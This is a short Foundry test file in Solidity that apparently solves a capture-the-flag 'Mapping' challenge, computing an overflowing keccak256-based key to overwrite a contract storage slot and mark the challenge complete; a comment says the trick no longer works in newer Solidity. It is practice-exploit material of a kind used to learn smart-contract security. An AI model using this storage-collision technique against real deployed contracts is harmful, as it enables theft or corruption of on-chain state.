// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Mapping.sol";

contract MappingTest is Test {

  MappingChallenge mappingChallenge;

  function setUp() public {
    mappingChallenge = new MappingChallenge();
  }

  function testAttack() public {
    unchecked {
        // no longer work since we can directly access index and assign value in solidity
        uint256 key = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        mappingChallenge.set(key, 1);
    }
    
    _checkSolved();
  }

  function _checkSolved() internal {
    assertTrue(mappingChallenge.isComplete(), "Challenge Incomplete");
  }

  receive() external payable {}
}